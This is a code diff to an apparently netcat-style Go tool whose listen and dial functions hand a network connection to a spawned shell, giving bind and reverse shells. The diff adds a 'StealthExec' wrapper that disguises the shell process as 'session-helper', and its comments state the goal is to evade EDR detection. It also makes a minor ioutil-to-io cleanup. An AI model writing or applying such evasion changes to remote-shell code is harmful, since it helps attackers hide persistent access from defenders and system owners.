@@ -26,11 +26,9 @@ import (
 	"fmt"
 	"github.com/axgle/mahonia"
 	"io"
-	"io/ioutil"
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"os/signal"
 	"runtime"
 	"strconv"
@@ -155,12 +153,19 @@ func listen(network, host string, port int, command bool) {
 		default:
 			shell = util.ShellPath()
 		}
-		cmd := exec.Command(shell)
+		// Use StealthExec with argv[0] spoofing so the spawned shell
+		// appears as "session-helper" in /proc/PID/cmdline rather than
+		// "/bin/sh" or "/bin/bash" (high-signal EDR detection pattern).
+		cmd := util.StealthExecCommand(shell, util.StealthExecOptions{
+			Argv0: "session-helper",
+			Comm:  "session-helper",
+		})
 		convert := newConvert(conn)
 		cmd.Stdin = convert
 		cmd.Stdout = convert
 		cmd.Stderr = convert
-		cmd.Run()
+		util.StealthExecStart(cmd, "session-helper")
+		cmd.Wait()
 		defer conn.Close()
 		logf("Closed: %s", conn.RemoteAddr())
 	} else {
@@ -176,7 +181,7 @@ func listen(network, host string, port int, command bool) {
 			return
 		}
 		if (fi.Mode() & os.ModeCharDevice) == 0 {
-			buffer, err := ioutil.ReadAll(os.Stdin)
+			buffer, err := io.ReadAll(os.Stdin)
 			if err != nil {
 				logf("Failed read: %s", err)
 			}
@@ -233,12 +238,17 @@ func dial(network, host string, port int, command bool) {
 		default:
 			shell = util.ShellPath()
 		}
-		cmd := exec.Command(shell)
+		// StealthExec: spawn shell with argv[0] camouflage as "session-helper".
+		cmd := util.StealthExecCommand(shell, util.StealthExecOptions{
+			Argv0: "session-helper",
+			Comm:  "session-helper",
+		})
 		convert := newConvert(conn)
 		cmd.Stdin = convert
 		cmd.Stdout = convert
 		cmd.Stderr = convert
-		cmd.Run()
+		util.StealthExecStart(cmd, "session-helper")
+		cmd.Wait()
 	} else {
 		go io.Copy(os.Stdout, conn)
 		fi, err := os.Stdin.Stat()
@@ -247,7 +257,7 @@ func dial(network, host string, port int, command bool) {
 			return
 		}
 		if (fi.Mode() & os.ModeCharDevice) == 0 {
-			buffer, err := ioutil.ReadAll(os.Stdin)
+			buffer, err := io.ReadAll(os.Stdin)
 			if err != nil {
 				logf("Failed read: %s", err)
 			}
